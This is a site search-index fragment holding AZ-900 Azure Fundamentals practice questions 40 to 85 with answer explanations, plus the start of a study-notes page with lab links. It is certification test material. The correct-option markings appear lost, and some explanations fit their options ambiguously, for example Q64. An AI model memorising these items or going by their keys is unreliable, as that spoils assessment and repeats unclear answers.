</ul>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-40-azure-pay-as-you-go-is-an-example-of-which-cloud-expenditure-model","title":"Question 40:\u00a0Azure Pay As you Go is an example of which cloud expenditure model?","text":"<ul> <li>Operational (OpEx) </li> <li>Capital (CapEx)</li> </ul>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-41-which-of-the-following-endpoints-for-a-managed-instance-enables-data-access-to-your-managed-instance-from-outside-a-virtual-network","title":"Question 41:\u00a0Which of the following endpoints for a managed instance enables data access to your managed instance from outside a virtual network?","text":"<ul> <li>Hybrid</li> <li>External  </li> <li>Private </li> <li>Public </li> </ul> <p>Public endpoint for a\u00a0managed instance\u00a0enables data access to your managed instance from outside the\u00a0virtual network. You are able to access your managed instance from multi-tenant Azure services like Power BI, Azure App Service, or an on-premises network. By using the public endpoint on a managed instance, you do not need to use a VPN, which can help avoid VPN throughput issues.</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-42-which-of-the-following-services-can-help-applications-absorb-unexpected-traffic-bursts-which-prevents-servers-from-being-overwhelmed-by-a-sudden-flood-of-requests","title":"Question 42:\u00a0Which of the following services can help applications absorb unexpected traffic bursts, which prevents servers from being overwhelmed by a sudden flood of requests?","text":"<ul> <li>Azure Decouple Storage</li> <li>Azure Table Storage</li> <li>Azure Queue Storage </li> <li>Azure Message Storage</li> </ul> <p>Azure Queue Storage\u00a0is a service for storing large numbers of messages. You access messages from anywhere in the world via authenticated calls using HTTP or HTTPS. A queue message can be up to 64 KB in size. A queue may contain millions of messages, up to the total capacity limit of a storage account. Queues are commonly used to create a backlog of work to process asynchronously.</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-43-in-which-scenario-would-you-use-the-business-to-business-b2b-collaboration-feature-in-azure-ad","title":"Question 43:\u00a0In which scenario would you use the Business-to-Business (B2B) collaboration feature in Azure AD?","text":"<ul> <li>Providing internal access to company reports.</li> <li>Granting external vendors access to a shared project workspaces </li> <li>Enabling employees to access internal applications.</li> <li>Allowing customers to sign up for your e-commerce website.</li> </ul> <p>Business-to-Business (B2B) collaboration in Azure AD is used to collaborate with users external to your organization, such as vendors or partners. It allows you to securely share resources like documents and applications while maintaining control over access.</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-44-which-of-the-following-best-describes-azure-arc","title":"Question 44:\u00a0Which of the following best describes Azure Arc?","text":"<ul> <li>A platform for building microservices-based applications that run across multiple nodes</li> <li>A bridge that extends the Azure platform to help you build apps with the flexibility to run across datacenters </li> <li>A service for analyzing and visualizing large datasets in the cloud</li> <li>A cloud-based identity and access management service</li> </ul> <p>Azure Arc\u00a0is a service from Microsoft that allows organizations to manage and govern their on-premises servers, Kubernetes clusters, and applications using Azure management tools and services. With Azure Arc, customers can use Azure services such as Azure Policy, Azure Security Center, and Azure Monitor to manage their resources across on-premises, multi-cloud, and edge environments. Azure Arc also enables customers to deploy and manage Azure services on-premises or on other clouds using the same tools and APIs as they use in Azure.</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-45-__-is-a-security-framework-that-uses-the-principles-of-explicit-verification-least-privileged-access-and-assuming-breach-to-keep-users-and-data-secure-while-allowing-for-common-scenarios-like-access-to-applications-from-outside-the-network-perimeter","title":"Question 45:\u00a0__ is a security framework that uses the principles of explicit verification, least privileged access, and assuming breach to keep users and data secure while allowing for common scenarios like access to applications from outside the network perimeter.","text":"<ul> <li>Least Trust</li> <li>No Trust</li> <li>Zero Trust </li> <li>Less Trust</li> </ul>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-46-yes-or-no-it-is-possible-to-have-multiple-subscriptions-inside-a-management-group","title":"Question 46:\u00a0Yes or No: It is possible to have multiple Subscriptions inside a Management Group.","text":"<ul> <li>Yes </li> <li>No</li> </ul>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-47-a-_______-endpoint-is-a-network-interface-that-uses-a-private-ip-address-from-your-virtual-network","title":"Question 47: A _______ endpoint is a network interface that uses a private IP address from your virtual network.","text":"<ul> <li>Public </li> <li>Internal </li> <li>Private </li> <li>Hybrid</li> </ul> <p>A private endpoint\u00a0is a network interface that uses a private IP address from your virtual network. This network interface connects you privately and securely to a service that's powered by Azure Private Link. By enabling a private endpoint, you're bringing the service into your virtual network.</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-48-you-are-the-lead-architect-of-your-organization-one-of-the-teams-has-a-requirement-to-copy-hundreds-of-tbs-of-data-to-azure-storage-in-a-secure-and-efficient-manner-the-data-can-be-ingested-one-time-or-an-ongoing-basis-for-archival-scenarios-which-of-the-following-would-be-a-good-solution-for-this-use-case","title":"Question 48:\u00a0You are the lead architect of your organization. One of the teams has a requirement to copy hundreds of TBs of data to Azure storage in a secure and efficient manner. The data can be ingested one time or an ongoing basis for archival scenarios. Which of the following would be a good solution for this use case?","text":"<ul> <li>Azure Data Lake Storage</li> <li>Azure Cosmos DB</li> <li>Azure File Sync</li> <li>Azure Data Box </li> </ul>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-49-which-of-the-following-two-storage-solutions-are-built-to-handle-nosql-data","title":"Question 49:\u00a0Which of the following two storage solutions are built to handle NoSQL data?","text":"<ul> <li>Azure SQL\u00a0Database</li> <li>Azure Table Storage </li> <li>Azure NoSQL\u00a0Database </li> <li>Azure Cosmos DB </li> </ul> <p>Azure Table storage\u00a0is a service that stores non-relational structured data (also known as structured NoSQL data) in the cloud, providing a key/attribute store with a schemaless design. Because Table storage is schemaless, it's easy to adapt your data as the needs of your application evolve. Azure Cosmos DB\u00a0is a fully managed NoSQL database for modern app development. Single-digit millisecond response times, and automatic and instant scalability, guarantee speed at any scale.</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-50-which-of-the-following-services-can-host-the-following-type-of-apps-web-apps-api-apps-webjobs-mobile-apps","title":"Question 50:\u00a0Which of the following services can host the following type of apps: Web apps, API apps, WebJobs, Mobile apps","text":"<ul> <li>Azure App Service </li> <li>Azure App Environment</li> <li>Azure Bastion</li> <li>Azure Arc</li> </ul>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-51-yes-or-no-subscriptions-can-be-moved-to-another-management-group-as-well-as-merged-into-one-single-subscription","title":"Question 51:\u00a0Yes or No: Subscriptions can be moved to another Management Group as well as merged into one Single subscription.","text":"<ul> <li>No </li> <li>Yes</li> </ul> <p>Even though Subscriptions can be moved to another management group, they cannot be merged into 1 single subscription.</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-52-______-lets-you-extend-your-on-premises-networks-into-the-microsoft-cloud-over-a-private-connection-with-the-help-of-a-connectivity-provider","title":"Question 52:\u00a0______ lets you extend your on-premises networks into the Microsoft cloud over a private connection with the help of a connectivity provider.","text":"<ul> <li>Azure DNS</li> <li>Azure Sentinel</li> <li>Azure ExpressRoute </li> <li>Azure Virtual Network</li> <li>Azure Firewall</li> </ul>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-53-azure-cosmosdb-is-an-example-of-a-_______-offering","title":"Question 53:\u00a0Azure CosmosDB\u00a0is an example of a _______ offering.","text":"<ul> <li>Software as a Service (SaaS)</li> <li>Platform as a Service (PaaS) </li> <li>Infrastructure as a Service (IaaS)</li> <li>Serverless Computing</li> </ul>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-54-yes-or-no-azure-cosmos-db-is-a-software-as-a-service-saas-offering-from-microsoft-azure","title":"Question 54:\u00a0Yes or No: Azure Cosmos DB is a\u00a0Software as a Service (SaaS)\u00a0offering from Microsoft Azure.","text":"<ul> <li>No, it is a PaaS\u00a0offering. </li> <li>No, it is an IaaS\u00a0offering.</li> <li>Yes, it is a SaaS\u00a0offering.</li> </ul>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-55-which-of-the-following-is-the-foundation-for-building-enterprise-data-lakes-on-azure-and-is-built-on-top-of-azure-blob-storage","title":"Question 55: Which of the following is the foundation for building enterprise data lakes on Azure AND\u00a0is built on top of Azure Blob storage?","text":"<ul> <li>Azure Data Lake Storage Gen4</li> <li>Azure Data Lake Storage Gen3</li> <li>Azure Data Lake Storage Gen1 </li> <li>Azure Data Lake Storage Gen2 </li> </ul> <p>Azure Data Lake Storage Gen2 is a set of capabilities dedicated to big data analytics, built on\u00a0Azure Blob Storage. Data Lake Storage Gen2 converges the capabilities of\u00a0Azure Data Lake Storage Gen1\u00a0with Azure Blob Storage. For example, Data Lake Storage Gen2 provides file system semantics, file-level security, and scale. Because these capabilities are built on Blob storage, you'll also get low-cost, tiered storage, with high availability/disaster recovery capabilities. Reference: https://docs.microsoft.com/en-us/azure/storage/blobs/data-lake-storage-introduction</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-56-someone-in-your-organization-accidentally-deleted-an-important-virtual-machine-that-has-led-to-huge-revenue-losses-your-senior-management-has-tasked-you-with-investigating-who-was-responsible-for-the-deletion-which-azure-service-can-you-leverage-for-this-task","title":"Question 56:\u00a0Someone in your organization accidentally deleted an important Virtual Machine that has led to huge revenue losses. Your senior management has tasked you with investigating who was responsible for the deletion. Which Azure service can you leverage for this task?","text":"<ul> <li>Azure Service Health</li> <li>Azure Arc</li> <li>Azure Monitor </li> <li>Azure Advisor</li> <li>Azure Event Hubs</li> </ul> <p>Log Analytics\u00a0is a tool in the Azure portal that's used to edit and run log queries with data in\u00a0**Azure Monitor **\u00a0Logs. You might write a simple query that returns a set of records and then use features of Log Analytics to sort, filter, and analyze them. Or you might write a more advanced query to perform statistical analysis and visualize the results in a chart to identify a particular trend. Whether you work with the results of your queries interactively or use them with other Azure Monitor features, such as log query alerts or workbooks, Log Analytics is the tool that you'll use to write and test them.</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-57-true-or-false-azure-dns-can-manage-dns-records-for-your-azure-services-but-cannot-provide-dns-for-your-external-resources","title":"Question 57:\u00a0True or False: Azure DNS can manage DNS records for your Azure services, but cannot provide DNS for your external resources.","text":"<ul> <li>False </li> <li>True </li> </ul> <p>Azure DNS can manage DNS records for your Azure services\u00a0and provide DNS for your external resources as well.\u00a0Azure DNS is integrated in the Azure portal and uses the same credentials, support contract, and billing as your other Azure services. DNS billing is based on the number of DNS zones hosted in Azure and on the number of DNS queries received. To learn more about pricing, see\u00a0Azure DNS pricing.</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-58-_______-is-a-strategy-that-employs-a-series-of-mechanisms-to-slow-the-advance-of-an-attack-thats-aimed-at-acquiring-unauthorized-access-to-information-each-layer-provides-protection-so-that-if-one-layer-is-breached-a-subsequent-layer-is-already-in-place-to-prevent-further-exposure","title":"Question 58:\u00a0_______\u00a0is a strategy that employs a series of mechanisms to slow the advance of an attack that's aimed at acquiring unauthorized access to information. Each layer provides protection so that if one layer is breached, a subsequent layer is already in place to prevent further exposure.","text":"<ul> <li>Defense in Depth </li> <li>Defense in Steps</li> <li>Defense in Layers</li> <li>Defense in Series</li> </ul>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-59-which-of-the-following-is-not-a-feature-of-azure-monitor","title":"Question 59:\u00a0Which of the following is NOT a feature of Azure Monitor?","text":"<ul> <li>Log Analytics</li> <li>Database management </li> <li>Metrics</li> <li>Alerts</li> </ul>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-60-true-or-false-when-you-cancel-an-azure-subscription-a-resource-lock-can-block-the-subscription-cancellation","title":"Question 60:\u00a0True or False: When you cancel an Azure subscription, a Resource Lock can block the subscription cancellation.","text":"<ul> <li>True </li> <li>False </li> </ul> <p>When you cancel an Azure subscription:</p> <ul> <li>A resource lock doesn't block the subscription cancellation.</li> <li>Azure preserves your resources by deactivating them instead of immediately deleting them.</li> <li>Azure only deletes your resources permanently after a waiting period.</li> </ul>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-61-yes-or-no-each-virtual-network-can-have-only-one-vpn-gateway","title":"Question 61:\u00a0Yes or No: Each virtual network can have only one VPN gateway.","text":"<ul> <li>No </li> <li>Yes </li> </ul> <p>VPN Gateway\u00a0sends encrypted traffic between an Azure virtual network and an on-premises location over the public Internet. You can also use VPN Gateway to send encrypted traffic between Azure virtual networks over the Microsoft network. A VPN gateway is a specific type of virtual network gateway. Each virtual network can have only one VPN gateway. However, you can create multiple connections to the same VPN gateway. When you create multiple connections to the same VPN gateway, all VPN tunnels share the available gateway bandwidth.</p> <p>When you configure a virtual network gateway, you configure a setting that specifies the gateway type. The gateway type determines how the virtual network gateway will be used and the actions that the gateway takes. The gateway type 'Vpn' specifies that the type of virtual network gateway created is a 'VPN gateway'. This distinguishes it from an ExpressRoute gateway, which uses a different gateway type. A virtual network can have two virtual network gateways; one VPN gateway and one ExpressRoute gateway. For more information, see\u00a0Gateway types.</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-62-which-of-the-following-is-a-benefit-of-using-azure-cloud-shell-for-managing-azure-resources","title":"Question 62:\u00a0 Which of the following is a benefit of using Azure Cloud Shell for managing Azure resources?","text":"<ul> <li>It eliminates the need to install and configure command-line interfaces on your local machine </li> <li>It provides faster access to Azure resources</li> <li>It offers more advanced features than other Azure management tools</li> <li>It allows for easier integration with third-party tools and services</li> </ul>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-63-__-is-a-domain-specific-language-dsl-that-uses-declarative-syntax-to-deploy-azure-resources","title":"Question 63:\u00a0__ is a domain-specific language (DSL) that uses declarative syntax to deploy Azure resources","text":"<ul> <li>Tricep</li> <li>Bicep </li> <li>PHP</li> <li>HTML</li> </ul>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-64-___-enforcement-is-at-the-center-of-a-zero-trust-architecture","title":"Question 64:\u00a0___ enforcement is at the center of a Zero Trust architecture.","text":"<ul> <li>Network</li> <li>Devices</li> <li>Identities </li> <li>Security policy </li> <li>Data</li> <li>Applications</li> </ul> <p>Security policy enforcement\u00a0is at the center of a Zero Trust architecture. This includes Multi Factor authentication with conditional access that takes into account user account risk, device status, and other criteria and policies that you set.</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-65-how-can-you-apply-a-resource-lock-to-an-azure-resource","title":"Question 65:\u00a0How can you apply a resource lock to an Azure resource?","text":"<ul> <li>By using the Azure API\u00a0for RBAC</li> <li>By configuring a network security group.</li> <li>By using the Azure portal or Azure PowerShell </li> <li>By assigning a custom role to the resource.</li> <li>By creating a new resource group for the resource.</li> </ul>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-66-in-azure-which-of-the-following-services-can-be-accessed-through-private-endpoints","title":"Question 66:\u00a0In Azure, which of the following services can be accessed through private endpoints?","text":"<ul> <li>Azure App Service. </li> <li>Azure Storage accounts.</li> <li>Azure SQL Database. </li> <li>All of the above. </li> <li>Azure Key Vault.</li> </ul> <p>Private endpoints can be used to access various Azure services, including Azure Storage accounts, Azure Key Vault, Azure App Service, and Azure SQL Database. By using private endpoints, you can connect to these services from within your virtual network, ensuring that the traffic remains within the Azure backbone network and doesn't traverse the public internet.</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-67-which-of-the-following-scenarios-is-a-suitable-use-case-for-applying-a-resource-lock","title":"Question 67:\u00a0Which of the following scenarios is a suitable use case for applying a resource lock?","text":"<ul> <li>Preventing read access to a development virtual machine.</li> <li>Automating the deployment of resources using templates.</li> <li>Ensuring a critical storage account is not accidentally deleted. </li> <li>Restricting network access to an Azure SQL database.</li> </ul>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-68-which-of-the-following-best-describes-the-concept-of-immutable-infrastructure-in-the-context-of-iac","title":"Question 68:\u00a0Which of the following best describes the concept of \"immutable infrastructure\" in the context of IaC?","text":"<ul> <li>Infrastructure that is managed through a graphical user interface.</li> <li>Infrastructure that cannot be changed once deployed. </li> <li>Infrastructure that is recreated rather than modified in place. </li> <li>Infrastructure that is stored in a physical data center.</li> </ul> <p>Immutable infrastructure refers to the practice of recreating infrastructure components whenever changes are needed rather than modifying them in place. This approach aligns with IaC principles, enhancing consistency and reducing configuration drift.</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-69-an-____-in-azure-monitor-monitors-your-telemetry-and-captures-a-signal-to-see-if-the-signal-meets-the-criteria-of-a-preset-condition-if-the-conditions-are-met-an-alert-is-triggered-which-initiates-the-associated-action-group","title":"Question 69:\u00a0A(n) ____ in Azure Monitor monitors your telemetry and captures a signal to see if the signal meets the criteria of a preset condition. If the conditions are met, an alert is triggered, which initiates the associated action group.","text":"<ul> <li>alert rule </li> <li>preset rule</li> <li>preset condition</li> <li>alert condition</li> </ul> <p>An\u00a0alert rule\u00a0monitors your telemetry and captures a signal that indicates that something is happening on a specified target. The alert rule captures the signal and checks to see if the signal meets the criteria of the condition. If the conditions are met, an alert is triggered, which initiates the associated action group and updates the state of the alert.</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-70-as-the-owner-of-a-streaming-platform-deployed-on-azure-you-notice-a-huge-spike-in-traffic-whenever-a-new-web-series-in-released-but-moderate-traffic-otherwise-which-of-the-following-is-a-clear-benefit-of-this-type-of-workload","title":"Question 70:\u00a0As the owner of a streaming platform deployed on Azure, you notice a huge spike in traffic whenever a new web-series in released but moderate traffic otherwise. Which of the following is a clear benefit of this type of workload?","text":"<ul> <li>Load balancing</li> <li>Elasticity </li> <li>High availability</li> <li>High latency</li> </ul> <p>Elasticity in this case is the ability to provide additional compute resource when needed (spikes) and reduce the compute resource when not needed to reduce costs. Load Balancing and High Availability are also great advantages the streaming platform would enjoy, but Elasticity is the option that best describes the workload in the Question. Autoscaling is an example of elasticity.</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-71-which-of-the-following-can-repeatedly-deploy-your-infrastructure-throughout-the-development-lifecycle-and-have-confidence-your-resources-are-deployed-in-a-consistent-manner","title":"Question 71:\u00a0Which of the following can repeatedly deploy your infrastructure throughout the development lifecycle and have confidence your resources are deployed in a consistent manner?","text":"<ul> <li>Azure Resource Manager templates </li> <li>The Azure API Management service</li> <li>Azure Templates</li> <li>Management groups</li> </ul> <p>Azure Resource Manager Templates is correct since templates are idempotent (Same), which means you can deploy the same template many times and get the same resource types in the same state.</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-72-in-the-context-of-infrastructure-as-code-iac-___-are-independent-files-typically-containing-set-of-resources-meant-to-be-deployed-together","title":"Question 72:\u00a0In the context of Infrastructure as Code (IaC), ___\u00a0 are independent files, typically containing set of resources meant to be deployed together.","text":"<ul> <li>Methods </li> <li>Modules </li> <li>Units</li> <li>Functions</li> </ul> <p>Modules\u00a0are independent files, typically containing set of resources meant to be deployed together. Modules allow you to break complex templates into smaller, more manageable sets of code. You can ensure that each module focuses on a specific task and that all modules are reusable for multiple deployments and workloads. Reference: https://learn.microsoft.com/en-us/azure/cloud-adoption-framework/ready/considerations/infrastructure-as-code</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-73-___-service-is-available-to-transfer-on-premises-data-to-blob-storage-when-large-datasets-or-network-constraints-make-uploading-data-over-the-wire-unrealistic","title":"Question 73:\u00a0___ service is available to transfer on-premises data to Blob storage when large datasets or network constraints make uploading data over the wire unrealistic.","text":"<ul> <li>Azure Blob Storage</li> <li>Azure FileSync</li> <li>Azure Data Factory</li> <li>Azure Data Box </li> </ul>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-74-which-type-of-resource-lock-allows-you-to-modify-the-resource-but-not-delete-it","title":"Question 74:\u00a0Which type of resource lock allows you to modify the resource, but not delete it?","text":"<ul> <li>CanNotModify lock</li> <li>Restrict lock</li> <li>CanNotDelete lock </li> <li>Read-only lock</li> </ul>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-75-your-colleague-is-looking-for-an-azure-service-that-can-help-them-understand-how-their-applications-are-performing-and-proactively-identify-issues-that-affect-them-and-the-resources-they-depend-on-whats-your-recommendation","title":"Question 75:\u00a0Your colleague is looking for an Azure service that can help them understand how their applications are performing and proactively identify issues that affect them , AND the resources they depend on. What's your recommendation?","text":"<ul> <li>Azure Monitor </li> <li>Azure Service Health</li> <li>Azure Advisor </li> <li>Azure Comprehend</li> </ul>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-76-which-cloud-deployment-model-is-best-suited-for-organizations-with-extremely-strict-data-security-and-compliance-requirements","title":"Question 76:\u00a0Which cloud deployment model is best suited for organizations with extremely strict data security and compliance requirements?","text":"<ul> <li>Community cloud</li> <li>Private cloud </li> <li>Public cloud</li> <li>Hybrid cloud </li> </ul>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-77-if-your-organization-has-many-azure-subscriptions-which-of-the-following-is-useful-to-efficiently-manage-access-policies-and-compliance-for-those-subscriptions","title":"Question 77:\u00a0If your organization has many Azure subscriptions, which of the following is useful to efficiently manage access, policies, and compliance for those subscriptions?","text":"<ul> <li>Azure Subscriptions</li> <li>Azure Policy</li> <li>Azure Management Groups </li> <li>Azure Blueprints</li> </ul>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-78-__-allows-you-to-implement-your-systems-logic-into-readily-available-blocks-of-code-that-can-run-anytime-you-need-to-respond-to-critical-events","title":"Question 78:\u00a0__ allows you to implement your system's logic into readily available blocks of code that can run anytime you need to respond to critical events.","text":"<ul> <li>Azure Cognitive Services</li> <li>Azure Application Insights</li> <li>Azure Functions </li> <li>Azure Kinect DK</li> <li>Azure Quantum</li> </ul> <p>Azure Functions provides \"compute on-demand\" in\u00a0two\u00a0significant ways. First, Azure Functions allows you to implement your system's logic into readily available blocks of code. These code blocks are called \"functions\". Different functions can run anytime you need to respond to critical events. Second, as requests increase, Azure Functions meets the demand with as many resources and function instances as necessary - but only while needed. As requests fall, any extra resources and application instances drop off automatically. </p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-79-you-have-managed-a-web-app-that-you-developed-and-deployed-on-prem-for-a-long-time-but-would-now-like-to-move-it-to-azure-and-relieved-of-all-the-manual-administration-and-maintenance-which-of-the-following-buckets-would-be-most-suitable-for-your-use-case","title":"Question 79:\u00a0You have managed a Web App that you developed and deployed On-Prem for a long time, but would now like to move it to Azure and relieved of all the manual administration and maintenance. Which of the following buckets would be most suitable for your use case?","text":"<ul> <li>Platform as a Service (PaaS) </li> <li>Software as a Service (SaaS)</li> <li>Infrastructure as a Service (IaaS)</li> <li>Database as a Service (DaaS)</li> </ul>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-80-microsofts-approach-to-privacy-is-built-on-six-principles-which-of-the-following-is-not-one-of-those-6-principles","title":"Question 80:\u00a0Microsoft's approach to privacy is built on six principles. Which of the following is NOT\u00a0one of those 6 principles?","text":"<ul> <li>Transparency</li> <li>Security</li> <li>Strong legal protections </li> <li>Protection </li> <li>Control</li> <li>No content-based targeting</li> </ul> <p>Microsoft's approach to privacy is built on six principles:</p> <ol> <li>Control: Microsoft provides customers with the ability to control their personal data and how it is used.</li> <li>Transparency: Microsoft is transparent about the collection, use, and sharing of personal data.</li> <li>Security: Microsoft takes strong measures to protect personal data from unauthorized access, disclosure, alteration, and destruction.</li> <li>Strong legal protections: Microsoft complies with applicable laws and regulations, including data protection and privacy laws.</li> <li>No content-based targeting:\u00a0Microsoft does not use personal data to target advertising to customers based on the content of their communications or files.</li> <li>Benefits to the customer:\u00a0Microsoft uses personal data to provide customers with valuable products and services that improve their productivity and overall experience.</li> </ol> <p>Protection is NOT\u00a0one of the principles.</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-81-in-the-context-of-azure-networking-what-is-the-purpose-of-a-network-security-group-nsg-associated-with-a-private-endpoint","title":"Question 81:\u00a0In the context of Azure networking, what is the purpose of a Network Security Group (NSG) associated with a private endpoint?","text":"<ul> <li>To manage IP address assignments for the private endpoint.</li> <li>To encrypt data traffic between the private endpoint and the Azure service.</li> <li>To ensure the availability and uptime of the private endpoint.</li> <li>To enforce access control rules on inbound and outbound traffic to the private endpoint. </li> </ul>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-82-true-or-false-each-zone-is-made-up-of-one-or-more-datacenters-equipped-with-common-power-cooling-and-networking","title":"Question 82:\u00a0True or False: Each zone is made up of one or more datacenters equipped with common power, cooling, and networking.","text":"<ul> <li>False </li> <li>True </li> </ul> <p>Azure Availability Zones are unique physical locations within an Azure region and offer high availability to protect your applications and data from datacenter failures. Each zone is made up of one or more datacenters equipped with\u00a0independent\u00a0power, cooling, and networking.</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-83-what-is-the-maximum-number-of-cloud-only-user-accounts-that-can-be-created-in-azure-ad","title":"Question 83:\u00a0What is the maximum number of cloud-only user accounts that can be created in Azure AD?","text":"<ul> <li>100,000</li> <li>500,000</li> <li>50,000</li> <li>1,000,000 </li> </ul> <p>The correct answer is\u00a0 1,000,000. Azure AD has the capability to hold up to\u00a01,000,000 cloud-only user accounts. This limit can be extended further by contacting Microsoft support.</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-84-your-organization-uses-microsoft-defender-for-cloud-and-you-receive-an-alert-that-suspicious-activity-has-been-detected-on-one-of-your-cloud-resources-what-should-you-do","title":"Question 84:\u00a0Your organization uses Microsoft Defender for Cloud and you receive an alert that suspicious activity has been detected on one of your cloud resources. What should you do?","text":"<ul> <li>Delete the cloud resource to prevent the threat from spreading.</li> <li> <p>Investigate the alert and take appropriate action to remediate the threat if necessary. </p> </li> <li> <p>Wait for a follow-up email from Microsoft Support before taking any action.</p> </li> <li>Ignore the alert, as Microsoft Defender for Cloud will automatically handle any threats.</li> </ul>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-85-which-of-the-following-resources-can-be-managed-using-azure-arc","title":"Question 85:\u00a0Which of the following resources can be managed using Azure Arc?","text":"<ul> <li>Only Kubernetes Clusters and Virtual\u00a0Machines</li> <li>All of these </li> <li>Kubernetes clusters</li> <li>Only Windows and Linux Servers &amp;\u00a0Virtual Machines</li> <li>Virtual machines</li> <li>Windows Server and Linux servers</li> </ul> <p>The answer is All of the these. Azure Arc enables you to manage resources both on-premises and across multiple clouds using a single control plane. This includes managing Windows Server and Linux servers, Kubernetes clusters, and virtual machines. By extending Azure services to hybrid environments, Azure Arc provides consistent management, security, and compliance across all resources.</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-preparation/","title":"AZ-900: Notes to get through the Azure Fundamentals Certificate","text":"<p>The following notes are derived from the Microsoft e-learning platform. They may not be entirely original, as I've included some paragraphs directly from the Microsoft e-learning platform and some other sources. However, what makes this repository particularly valuable is my effort to enrich and curate the content, along with the addition of valuable tips that can assist anyone in passing the exam.</p> <ul> <li>Notes taken in: September 2023.</li> <li>Certification accomplish at: 23th September 2023.</li> <li>Practice tests: Practice tests from different sources.</li> </ul> <p>Sources of this notes:</p> <ul> <li>The Microsoft e-learn platform.</li> <li>Book:  \"Microsoft Certified - Azure Fundamentals. Study guide\", by Jim Boyce. </li> <li>Udemy course: AZ-900 Bootcamp: Microsoft Azure Fundamentals.</li> <li>Udemy course: AZ-900 Microsoft Azure Fundamentals Practice Tests, Sep 2023</li> <li>Linkedin course: Exam tips: Microsoft Azure Fundamentals (AZ-900) </li> </ul> Labs and resources <ul> <li>All labs.</li> <li>Deploy a file share in Microsoft Azure</li> <li>Deploy a virtual network in Microsoft Azure</li> <li>[Provision a resource group in Azure](https://labitpro.com/provision-a-resource-group-in-azure/ </li> <li>Deploy and configure an Azure Virtual Machine</li> <li>Deploy and configure an Azure Storage Account</li> <li>Deploy and configure a network security group</li> <li>[Deploy and configure Azure Bastion](https://labitpro.com/deploy-and-configure-azure-bastion/</li> <li>Add a Custom Domain to Azure AD</li> <li>Create Users and Groups in Azure AD</li> <li>Configure Self-Service Password Reset in Azure AD</li> <li>Create and Configure an Azure Storage Account</li> <li>Manage Azure Storage Account Access Keys</li> <li>Create an Azure File Share</li> <li>Create and Attach a VM Data Disk</li> <li>Resize an Azure Virtual Machine</li> <li>Create a VM Scale Set in Azure</li> <li>Configure vNet Peering</li> <li>Create and Configure an Azure Recovery Services Vault</li> <li>Managing Users and Groups in Azure AD</li> <li>Practice with a mock exam.</li> <li>AZ-900 crossword puzzle </li> 